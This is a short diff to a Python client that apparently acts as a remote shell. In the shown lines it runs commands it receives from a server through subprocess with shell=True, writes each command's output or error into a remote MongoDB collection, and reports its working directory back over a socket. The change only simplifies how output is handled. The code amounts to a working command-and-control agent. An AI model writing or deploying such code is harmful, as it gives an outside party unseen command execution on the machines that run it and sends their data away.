@@ -16,7 +16,7 @@ if find_spec('pymongo'):
 else:
     exit(0)
 
-errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception, BrokenPipeError)
+errors_might_happen = (pymongo.errors.ServerSelectionTimeoutError, socket.error, Exception)
 signal.signal(signal.SIGINT, signal.SIG_DFL)
 
 
@@ -62,13 +62,12 @@ class Client:
                         pass
                 out, error = subprocess.Popen(msg_got, shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE).communicate()
+                out, error = out.decode().strip(), error.decode().strip()
+
                 if out:
-                    if len(out.decode().strip()) >= 1:
-                        self.mycol.insert_one(self.msg_to_send(out.decode().strip()))
-                    else:
-                        self.mycol.insert_one(self.msg_to_send("command has no shown value"))
-                else:
-                    self.mycol.insert_one(self.msg_to_send(error.decode().strip()))
+                    self.mycol.insert_one(self.msg_to_send(out))
+                elif error:
+                    self.mycol.insert_one(self.msg_to_send(error))
 
                 self.s.send(getcwd().encode())  # last path after command, to keep server updated
             except errors_might_happen:
